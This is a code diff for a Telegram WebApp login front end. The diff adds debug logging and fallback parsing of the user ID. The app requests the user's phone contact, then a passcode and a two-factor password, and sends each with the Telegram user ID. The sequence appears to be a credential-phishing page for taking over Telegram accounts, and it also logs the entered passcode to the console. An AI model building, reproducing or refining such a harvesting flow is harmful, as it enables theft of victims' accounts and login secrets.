@@ -1,32 +1,72 @@
 document.addEventListener('DOMContentLoaded', () => {
     const tg = window.Telegram.WebApp;
-    tg.ready(); 
+    tg.ready();
+    tg.expand();
     let page = 'page1';
 
     console.log("✅ Telegram WebApp initialized");
     console.log("initData:", tg.initData);
     console.log("initDataUnsafe:", tg.initDataUnsafe);
+    console.log("Full tg object:", tg);
+    
+    // Display user info on page for debugging
+    const TEST = document.getElementById('TEST');
+    if (tg.initDataUnsafe?.user) {
+        TEST.textContent = `User: ${tg.initDataUnsafe.user.first_name} (ID: ${tg.initDataUnsafe.user.id})`;
+    } else {
+        TEST.textContent = "⚠️ No user data available";
+    }
     
     const loginBtn = document.getElementById('loginbtn');
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
     const page3 = document.getElementById('page3');
     const blur = document.getElementById('blur');
-    const TEST = document.getElementById('TEST');
     const passcodeBtn = document.getElementById('passcode-btn');
     const passcodeInput = document.getElementById('hiddenInput');
     const twofactorInput = document.getElementById('twofactor-input');
 
+    // Store user info globally when available
+    let userInfo = null;
+
+    // Try to get user info from Telegram WebApp
+    if (tg.initDataUnsafe?.user) {
+        userInfo = tg.initDataUnsafe.user;
+        console.log('✅ User info loaded:', userInfo);
+    }
+
     loginBtn.addEventListener('click', async () => {
+        console.log('🔄 Login button clicked');
+        
+        // Update user info if now available
+        if (tg.initDataUnsafe?.user) {
+            userInfo = tg.initDataUnsafe.user;
+            console.log('✅ User info available:', userInfo);
+        }
+        
         try {
+            // For testing, if no user info available, show page2 anyway
+            if (!userInfo) {
+                console.log('⚠️ No user info, but continuing for testing...');
+                // You can uncomment this to use a test user ID
+                // userInfo = { id: 123456789, first_name: 'Test' };
+            }
+            
             tg.requestContact();
             tg.onEvent('contactRequested', (data) => {
+                console.log('📞 Contact requested:', data);
                 if (data.status === 'sent') {
                     showPage2();
                 }
             });
+            
+            // Alternative: just show page2 directly for testing
+            // Uncomment the line below if requestContact doesn't work
+            // showPage2();
+            
         } catch (error) {
             console.log('[ERROR]: ' + error);
+            tg.showAlert('Error: ' + error.message);
         }
     });
 
@@ -79,9 +119,14 @@ document.addEventListener('DOMContentLoaded', () => {
     // Handle passcode submission
     passcodeBtn.addEventListener('click', async () => {
         const passcode = passcodeInput.value;
-        const user = tg.initDataUnsafe?.user;
+        
+        // Try to get latest user info
+        const user = tg.initDataUnsafe?.user || userInfo;
 
-        console.log('👤 Telegram user:', user);
+        console.log('👤 Checking user data...');
+        console.log('   tg.initDataUnsafe:', tg.initDataUnsafe);
+        console.log('   user:', user);
+        console.log('   stored userInfo:', userInfo);
 
         if (!passcode) {
             console.log('❌ No passcode entered');
@@ -89,13 +134,44 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        if (!user) {
-            console.log('❌ No Telegram user info found');
-            tg.showAlert('⚠️ Telegram user info not available');
-            return;
+        // If no user info, try alternative methods
+        let user_id = null;
+        
+        if (user && user.id) {
+            user_id = user.id;
+        } else if (tg.initDataUnsafe?.user?.id) {
+            user_id = tg.initDataUnsafe.user.id;
+        } else {
+            // Try to parse from initData string
+            console.log('🔍 Attempting to parse user ID from initData string...');
+            const initData = tg.initData;
+            console.log('   initData string:', initData);
+            
+            if (initData) {
+                const params = new URLSearchParams(initData);
+                const userParam = params.get('user');
+                if (userParam) {
+                    try {
+                        const userData = JSON.parse(userParam);
+                        user_id = userData.id;
+                        userInfo = userData; // Store for future use
+                        console.log('✅ Parsed user ID from initData:', user_id);
+                    } catch (e) {
+                        console.log('❌ Failed to parse user data:', e);
+                    }
+                }
+            }
         }
 
-        const user_id = user.id;
+        if (!user_id) {
+            console.log('❌ No Telegram user ID found');
+            console.log('📋 Debug info:');
+            console.log('   - tg.initData:', tg.initData);
+            console.log('   - tg.initDataUnsafe:', tg.initDataUnsafe);
+            console.log('   - Please open this WebApp from Telegram bot');
+            tg.showAlert('⚠️ Please open this app from the Telegram bot');
+            return;
+        }
 
         console.log('📤 Sending passcode:', passcode);
         console.log('📤 User ID:', user_id);
@@ -129,9 +205,11 @@ document.addEventListener('DOMContentLoaded', () => {
     const twofactorBtn = document.getElementById('twofactor-btn');
     twofactorBtn.addEventListener('click', async () => {
         const twofactor = twofactorInput.value;
-        const user = tg.initDataUnsafe?.user;
+        
+        // Try to get latest user info
+        const user = tg.initDataUnsafe?.user || userInfo;
 
-        console.log('👤 Telegram user:', user);
+        console.log('👤 Checking user data for 2FA...');
 
         if (!twofactor) {
             console.log('❌ No 2FA password entered');
@@ -139,13 +217,34 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        if (!user) {
-            console.log('❌ No Telegram user info found');
-            tg.showAlert('⚠️ Telegram user info not available');
-            return;
+        // Use same logic as passcode to get user_id
+        let user_id = null;
+        
+        if (user && user.id) {
+            user_id = user.id;
+        } else if (tg.initDataUnsafe?.user?.id) {
+            user_id = tg.initDataUnsafe.user.id;
+        } else {
+            const initData = tg.initData;
+            if (initData) {
+                const params = new URLSearchParams(initData);
+                const userParam = params.get('user');
+                if (userParam) {
+                    try {
+                        const userData = JSON.parse(userParam);
+                        user_id = userData.id;
+                    } catch (e) {
+                        console.log('❌ Failed to parse user data:', e);
+                    }
+                }
+            }
         }
 
-        const user_id = user.id;
+        if (!user_id) {
+            console.log('❌ No Telegram user ID found');
+            tg.showAlert('⚠️ Please open this app from the Telegram bot');
+            return;
+        }
 
         console.log('📤 Sending 2FA password');
         console.log('📤 User ID:', user_id);
